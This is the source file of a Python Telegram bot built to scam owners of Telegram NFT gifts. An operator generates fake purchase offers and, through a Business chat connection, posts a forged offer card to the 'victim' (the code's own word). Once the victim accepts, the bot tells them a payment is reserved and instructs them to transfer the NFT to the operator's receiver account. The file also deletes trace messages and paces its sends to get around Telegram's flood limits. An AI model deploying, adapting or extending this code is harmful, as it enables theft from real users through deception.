import os
import re
import uuid
import asyncio
import logging
import sys
from aiogram import Bot, Dispatcher, F, Router
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.filters import Command
from aiogram.types import (Message, CallbackQuery, InlineKeyboardButton,
                           InlineKeyboardMarkup, BusinessConnection)
from dotenv import load_dotenv

from app import make_offer, get_offer

load_dotenv()
logging.basicConfig(level=logging.INFO, stream=sys.stdout)
log = logging.getLogger("offerbot")

BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID", "0"))
BASE_URL = os.getenv("WEBAPP_BASE", "http://localhost:8080")
RECEIVER = os.getenv("RECEIVER_USERNAME", "vo1d_root")

bot = Bot(BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()
router = Router()
dp.include_router(router)

# Регулярки
NFT_RE = re.compile(r"https?://t\.me/nft/([A-Za-z0-9_-]+)", re.I)
PRICE_RE = re.compile(r"(\d+)\s*(gram|грам|звезд|star|stars|⭐|grams)", re.I)
CODE_RE = re.compile(r"(of_[a-f0-9]{5})", re.I)

def parse_nft(url: str):
    m = NFT_RE.search(url)
    if not m: return None
    slug_raw = m.group(1)
    parts = slug_raw.rsplit("-", 1)
    if len(parts) == 2 and parts[1].isdigit():
        name_raw, num = parts
    else:
        name_raw, num = slug_raw, ""
    display = re.sub(r"(?<!^)(?=[A-Z])", " ", name_raw).strip()
    full = f"{display} #{num}" if num else display
    return {"slug": slug_raw, "name": full}

def parse_price(text: str):
    m = PRICE_RE.search(text)
    if not m: return None
    amount, unit = m.group(1), m.group(2).lower()
    return f"{amount} Gram" if unit in ("gram", "грам", "grams") else f"{amount} Stars"

# ==========================================
# ЛИЧКА БОТА (Генерация оффера)
# ==========================================
@router.message(Command("start"))
async def cmd_start(msg: Message):
    if msg.from_user.id != ADMIN_ID: return
    await msg.reply(
        "🤖 <b>Бот готов!</b>\n\n"
        "Чтобы создать оффер, напиши:\n"
        "<code>/купить [ссылка] [цена]</code>\n\n"
        "Пример:\n"
        "<code>/купить https://t.me/nft/MirageLamp-73768 155 GRAM</code>"
    )

@router.message(F.text.regexp(r"^/купить\s+"))
async def cmd_buy(msg: Message):
    if msg.from_user.id != ADMIN_ID: return

    text_clean = msg.text.replace("/купить", "").strip()
    nft = parse_nft(text_clean)
    price = parse_price(text_clean)

    if not nft or not price:
        await msg.reply("❌ Не понял ссылку или цену. Пример:\n<code>/купить https://t.me/nft/... 155 GRAM</code>")
        return

    oid = "of_" + uuid.uuid4().hex[:5]
    
    make_offer(
        nft_name=nft["name"], nft_slug=nft["slug"], price=price,
        buyer=msg.from_user.username or "buyer", 
        target_user="target", target_chat_id=0, offer_id=oid
    )

    await msg.reply(
        f"✅ <b>Оффер создан!</b>\n\n"
        f"Подарок: {nft['name']}\n"
        f"Цена: {price}\n\n"
        f"Код: <code>{oid}</code>\n"
        f"Отправь его в чат с жертвой."
    )

# ==========================================
# BUSINESS-ЧАТ (Отправка карточки)
# ==========================================
@router.business_message(F.text)
async def handle_business_message(msg: Message):
    # Игнорируем, если пишет не админ
    if msg.from_user and msg.from_user.id != ADMIN_ID: return

    # Ищем код оффера в тексте
    m = CODE_RE.search(msg.text)
    if not m: return

    oid = m.group(1).lower()
    offer = get_offer(oid)

    if not offer:
        log.error(f"❌ Оффер {oid} не найден в базе")
        return

    log.info(f"✅ Найден оффер {oid}. Начинаем отправку...")

    # Получаем conn_id
    conn_id = msg.business_connection_id
    if not conn_id:
        log.error("❌ Нет business_connection_id! Убедись, что это Business-чат.")
        return

    # 1. Удаляем код из чата (тихо, без спама в логи)
    try:
        await bot.delete_message(chat_id=msg.chat.id, message_id=msg.message_id)
    except Exception:
        pass # Если не удалилось (PEER_FLOOD или уже удалено), просто идем дальше

    # 2. Пауза для обхода флуда
    await asyncio.sleep(2)

    # 3. Формируем карточку
    target_user = msg.from_user.username or "buyer"
    card_text = (
        f"Пользователь <b>{target_user}</b> предлагает Вам <b>{offer['price']}</b> "
        f"за подарок <b>{offer['nft_name']}</b>.\n\n"
        f"Предложение действует ещё <b>6ч 0м</b>.\n\n"
        f"https://t.me/nft/{offer['nft_slug']}"
    )

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Отклонить", callback_data=f"reject:{oid}"),
         InlineKeyboardButton(text="Принять", callback_data=f"accept:{oid}")]
    ])
    
    # 4. Отправляем
    try:
        await bot.send_message(
            chat_id=msg.chat.id,
            text=card_text,
            business_connection_id=conn_id,
            reply_markup=kb,
            disable_web_page_preview=False
        )
        log.info("✅ Карточка успешно отправлена")
    except Exception as e:
        log.error(f"❌ Ошибка отправки: {e}")

# ==========================================
# КНОПКИ
# ==========================================
@router.callback_query(F.data.startswith("reject:"))
async def on_reject(cb: CallbackQuery):
    try:
        await cb.message.edit_reply_markup(reply_markup=None)
    except: pass
    await cb.answer("Вы отклонили предложение.")

@router.callback_query(F.data.startswith("accept:"))
async def on_accept(cb: CallbackQuery):
    oid = cb.data.split(":", 1)[1]
    o = get_offer(oid)
    if not o: 
        await cb.answer("Оффер истек", show_alert=True)
        return
    
    conn_id = cb.message.business_connection_id
    
    if conn_id:
        text = (
            f"<b>Сумма {o['price']} зарезервирована.</b>\n\n"
            f"Чтобы завершить сделку:\n"
            f"1. Нажмите на карточку подарка выше\n"
            f"2. Выберите «Передать NFT»\n"
            f"3. Укажите получателя: <b>@{RECEIVER}</b>\n"
            f"4. Подтвердите передачу."
        )
        try:
            await bot.send_message(
                chat_id=cb.message.chat.id, 
                text=text, 
                business_connection_id=conn_id
            )
        except Exception as e:
            log.error(f"Ошибка при отправке инструкции: {e}")
    
    try:
        await cb.message.edit_reply_markup(reply_markup=None)
    except: pass
    await cb.answer()

# ==========================================
# BUSINESS CONNECTION
# ==========================================
@router.business_connection()
async def on_business_conn(conn: BusinessConnection):
    log.info(f"✅ Business connection УСТАНОВЛЕН: user={conn.user.id} id={conn.id}")

# ==========================================
# ЗАПУСК
# ==========================================
async def main():
    log.info("Starting bot...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    import threading
    from app import flask_app

    def _run_flask():
        port = int(os.getenv("PORT", "8080"))
        flask_app.run(host="0.0.0.0", port=port, threaded=True, use_reloader=False)

    threading.Thread(target=_run_flask, daemon=True).start()
    asyncio.run(main())
